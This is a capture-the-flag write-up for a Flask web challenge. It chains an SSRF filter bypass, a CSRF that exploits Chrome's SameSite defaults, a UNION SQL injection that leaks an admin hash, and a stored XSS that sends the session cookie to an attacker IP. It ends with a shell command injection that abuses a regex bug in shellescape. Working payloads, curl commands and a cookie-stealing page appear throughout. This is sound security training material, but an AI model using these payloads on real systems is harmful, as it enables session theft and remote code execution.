---
layout: post
title: HackMeBackIfUCanSQLite - Web Challenge
date: 2026-01-14
categories: writeup
tags: [posts,ethicxz,SSRF,CSRF,XSS,SQLi,Command Injection,Web]
author: Ethicxz
image: start/HackMeBackIfUCanSQLite.png
description: Writeup Web Challenge
---

{% include toc.html %}

# HackMeBackIfUCanSQLite

## Features

- `@app.route('/')` : This only returns `index.html`
- `@app.route('/report',methods=['GET'])` : Perform a `GET` request on the given `URL` 
- `@app.route('/login', methods=['GET', 'POST'])` : Try to log in the user gives a username and a password (for POST, GET just returns the login page)
- `@app.route('/admin', methods=['GET', 'POST'])`
    - `GET` : This only returns `admin.html` (if we are admin)
    - `POST` : 
        - `check_c2` : Executes a system `ping` command on the provided `domain` and returns the output
        - `get_todolist` : Queries the database to retrieve the `todo` entry corresponding to the provided `id`

At first glance, our goal is to gain admin rights to access the two features on /admin

## Source code

### app.py

```python
from flask import Flask, render_template, request, redirect, session
import psycopg2
import hashlib
import sqlite3
from shellescape import quote
import subprocess
from bot import visit

app = Flask(__name__)
app.secret_key = "DontWasteTimeOnThisSecretItsNotEvenTheSameInProduction"
app.config['SESSION_COOKIE_HTTPONLY'] = False


conn = sqlite3.connect('midnight.db',check_same_thread=False)


# Init Database
# /!\    Don't waste time bruteforcing the md5 hash ;)    /!\
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users(id SERIAL PRIMARY KEY, username varchar, password varchar);")
cursor.execute("INSERT INTO users(id, username, password) VALUES (1,'admin','f71dbe52628a3f83a77ab494817525c6') ON CONFLICT DO NOTHING;")
cursor.execute("CREATE TABLE IF NOT EXISTS todolist(id SERIAL PRIMARY KEY, todo varchar);")
cursor.execute("INSERT INTO todolist(id, todo) VALUES (1,'Hacker Tesla') ON CONFLICT DO NOTHING;")
cursor.execute("INSERT INTO todolist(id, todo) VALUES (2,'Hacker mon prof de math') ON CONFLICT DO NOTHING;")
conn.commit()



@app.route('/')
def home():
    return render_template('index.html')


@app.route('/report',methods=['GET'])
def report():
    url = request.args.get('url')
    if url.startswith("http://127.0.0.1"):
        visit(url)
        msg = "Merci de m'avoir reporté un bug ! (Même si j'ai du mal à y croire, mon site est ultra sécurisé... après tout, je suis un hacker.)"
    else :
        msg = "Désolé petit script kiddie, je ne clique pas sur les liens malveillants"
    return render_template('report.html',msg=msg)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, hashlib.md5(password.encode()).hexdigest()))
        user = cursor.fetchall()
        if user:
            session['username'] = user[0][1]
            return redirect('/admin')
        else:
            return render_template('login.html', error=True)
    return render_template('login.html', error=False)



@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if 'username' in session and session['username'] == "admin" :
        if request.method == 'POST':
            if request.form['action'] == 'check_c2':
                ping = subprocess.run(["/bin/bash","-c",f"ping -c 3 {quote(request.form['domain'])}"], capture_output=True, text=True)
                if ping.returncode == 0:
                    res_ping = ping.stdout
                else:
                    res_ping = ping.stderr
                return render_template('admin.html',c2_status=res_ping)

            elif request.form['action'] == 'get_todolist':
                try:
                    cursor.execute(f"SELECT todo FROM todolist WHERE id={request.form['id']}")
                    todolist = cursor.fetchone()[0]
                except:
                    todolist = "An error occured"
                return render_template('admin.html',todolist=todolist)
            else :
                error = "Action should be set"
                return render_template('admin.html',error=error)
        else :
            return render_template('admin.html')
    else:
        return redirect('/login')

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True,port=5000,threaded=True)
```
### bot.py

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from time import sleep
from os import environ

def visit(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-jit")
    chrome_options.add_argument("--disable-wasm")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.binary_location = "/usr/bin/chromium-browser"

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.set_page_load_timeout(3)

    driver.get("http://127.0.0.1:5000")
    driver.add_cookie({
        "name": "session",
        "value": "eyJ1c2VybmFtZSI6ImFkbWluIn0.aSdpMw.SgaAfW5UAFGQPH4b7KpuAeF_bAo",   # The token isn't the same on production... can u steal it anyway ?
        "path": "/",
        "httpOnly": False,
        "samesite": "Strict",
        "domain": "127.0.0.1"
    })
    try:
        driver.get(url)
    except: pass

    sleep(3)
    driver.close()
```

## SSRF

The first thing we could test, and the first thing that immediately catches our eye, is this :

```python
if url.startswith("http://127.0.0.1"):
        visit(url)
```
In summary, the code is only checking if the given `URL` start with `127.0.0.1` 

But what if we try the standard HTTP syntax `http://username:password@hostname`

We could try something like `report?url=127.0.0.1@whatever_like_our_ip`

![alt text](../assets/img/HackMeBackIfUCanSQLite/1er.png)

![alt text](../assets/img/HackMeBackIfUCanSQLite/2eme.png)

Ok nice !

It's cool but what we can do with this `GET`

## CSRF

Initially, we can see that no CSRF token is present - Furthermore, in the bot file, the challenge author deliberately made a mistake by putting :

```python
"samesite": "Strict",
```

Instead of 

```python
"SameSite": "Strict",
```

So we're going to end up in Chrome default mode - Which is `Lax`

So the CSRF isn't supposed to work BUT :

`Chrome` has a temporary exception (the `Lax-allowing-unsafe`): a cookie created less than 2 minutes ago without an explicit `SameSite` attribute is treated as `SameSite=None`

Since the bot connects (`driver.get("http://127.0.0.1:5000")`) just before arriving at our `URL`, the cookie is `"fresh"`

In conclusion, we can `CSRF` because the bot will be `SameSite=None`

## CSRF --> SQLi to XSS

In `app.py`, we can see this

```python
cursor.execute(f"SELECT todo FROM todolist WHERE id={request.form['id']}")
```
Since we're working locally, we'll manually switch to admin to more easily find the `SQLi` query before attempting to execute it on the `bot`.

```bash
curl 172.17.0.2:5000/admin -b "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aWdtMA.-6x8hOpiCizRTuRDrv90CQgF-S4" -d "action=get_todolist&id=1"

<p id="result-status">Hacker Tesla</p>
```
We can trigger the SQLi just by putting a negative value like `-1`

```bash
curl 172.17.0.2:5000/admin -b "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aWdtMA.-6x8hOpiCizRTuRDrv90CQgF-S4" -d "action=get_todolist&id=-1"

<p id="result-status">An error occured</p>
```
Ok let's exploit it

```bash
curl 172.17.0.2:5000/admin -b "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aWdtMA.-6x8hOpiCizRTuRDrv90CQgF-S4" -d "action=get_todolist&id=-1+UNION+SELECT+password+from+users--+"

<p id="result-status">f71dbe52628a3f83a77ab494817525c6</p>
```
But in the code we can see 

```python
# /!\    Don't waste time bruteforcing the md5 hash ;)    /!\
```
But let's analyse the code again :

```python
return render_template('admin.html',todolist=todolist)
```
```html
<p id="result-status">{{ todolist|safe }}</p>
```
The code returns the variable to the HTML view

The subtle trick in `(Jinja2)` : By default, `Flask (Jinja2)` "escapes" variables (it transforms `<` into `&lt;`)

But in `admin.html` we can see `{{ todolist|safe }}` - The `| safe` filter tells `Flask` : "Don't worry, what comes from the database is safe, don't modify it." Since our script comes from the "database", `Flask` injects it raw into the HTML !

Ok let's try it 

```sql
-1 UNION SELECT '<script>alert(1)</script>'-- -
```

![alt text](../assets/img/HackMeBackIfUCanSQLite/3.png)

```sql
-1 UNION SELECT '<script>document.location="http://10.21.96.132:8000/?c"+document.cookie</script>'-- -
```

![alt text](../assets/img/HackMeBackIfUCanSQLite/4.png)

Ok nice !

We'll combine everything to get the cookie, but starting from `?report=url`

### app.py

```python
from flask import Flask, send_file, render_template

app = Flask(__name__)

@app.route('/')
def steal():
    return send_file('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```
### index.html

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Hello Admin !</h1>
    
    <form id="pwn" action="http://127.0.0.1:5000/admin" method="POST">
        <input type="hidden" name="action" value="get_todolist">
        <input type="hidden" name="id" value="-1 UNION SELECT '<script>document.location=`http://10.21.96.132:8000/?c=`+document.cookie</script>'-- -">
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
![alt text](../assets/img/HackMeBackIfUCanSQLite/5.png)

Ok nice we are admin !

Now we can go `/admin`

## Command Injection

Now the function that interests us is

```python
if request.form['action'] == 'check_c2':
    ping = subprocess.run(["/bin/bash","-c",f"ping -c 3 {quote(request.form['domain'])}"], capture_output=True, text=True)
    if ping.returncode == 0:
        res_ping = ping.stdout
    else:
        res_ping = ping.stderr
    return render_template('admin.html',c2_status=res_ping)
```
We can think about a `Command Injection` because the code make a `ping` via a `subprocess` 

For example if we put our ip :

```bash
curl 172.17.0.2:5000/admin -b 'session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aWeEng.bgEDg87hMpYnvtXf-XcmhVIRmK8' -d 'domain=10.21.96.132&action=check_c2'

    <p id="result-status">PING 10.21.96.132 (10.21.96.132): 56 data bytes
64 bytes from 10.21.96.132: seq=0 ttl=64 time=0.071 ms
64 bytes from 10.21.96.132: seq=1 ttl=64 time=0.155 ms
64 bytes from 10.21.96.132: seq=2 ttl=64 time=0.122 ms

--- 10.21.96.132 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.071/0.116/0.155 ms
</p>
```
But this is useless...

If we check the `requirements.txt` file, we can see this 

```console
shellescape==3.4.1
```
And in the app.py

```python
from shellescape import quote

......

ping = subprocess.run(["/bin/bash","-c",f"ping -c 3 {quote(request.form['domain'])}"], capture_output=True, text=True)
```
And if we check the github, we can see this `PR` :

[Pull Request 2](https://github.com/chrissimpkins/shellescape/pull/2/files)

The diff is here :

```python
import re


[-] _find_unsafe = re.compile(r'[a-zA-Z0-9_^@%+=:,./-]').search
[+] _find_unsafe = re.compile(r'[^a-zA-Z0-9_^@%+=:,./-]').search


def quote(s):
```
So basically, the library is supposed to check for dangerous characters to decide if it needs to wrap your input in quotes - Instead, because they forgot the `^` (which means `NOT`), the code is checking for safe characters (letters, numbers)

So here is what happens : 

- The Logic Fail: The function `quote()` thinks: "If i see a normal letter or number, i'll put quotes around the string to be safe. If i don't see any, i'll assume it's fine and leave it raw."

So for example, in `bash` we can do this :

```bash
0a47ad2d7804:/app# $(cat flag.txt)

bash: MCTF{FAKE_FLAG}: command not found
```
But we can do exactly the same with this payload :

```bash
0a47ad2d7804:/app# $(<????????)

bash: MCTF{FAKE_FLAG}: command not found
```
The regex matches letters and numbers, but `?`, `<`, `(`, `)` and `$` are not on the list

So we can just use this payload

```bash
$(<????????)
```
And the payload will not be enclosed in quotes

```bash
curl 172.17.0.2:5000/admin -b 'session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aWeEng.bgEDg87hMpYnvtXf-XcmhVIRmK8' -d 'domain=$(<????????)&action=check_c2'

<p id="result-status">ping: bad address &#39;MCTF{FAKE_FLAG}&#39;
```
Now we can just do exactly the same on remote !

Thanks a lot to the creator of this challenge, `Owne` !

- [His twitter](https://x.com/__owne__)
- [His RootMe](https://www.root-me.org/owne?lang=fr)